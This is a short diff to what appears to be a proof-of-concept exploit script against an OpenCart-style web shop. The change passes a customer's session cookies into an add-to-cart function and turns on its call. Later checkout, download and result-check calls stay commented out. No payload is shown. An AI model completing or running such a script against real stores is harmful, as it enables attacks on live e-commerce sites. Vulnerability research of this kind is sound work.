@@ -89,7 +89,7 @@ def logincus():
     
 
 
-def addcart():
+def addcart(cus_cookies):
     
     
     burp0_url = "http://"+host+":80/index.php?route=checkout/cart/add"
@@ -238,7 +238,7 @@ if __name__ == "__main__":
     print("poc run ")
     register(adcookies,adtoken)
     cus_cookies=logincus()
-    # addcart()
+    addcart(cus_cookies)
     # checkout()
     # r_check=download()
     # result=check_poc(r_check)
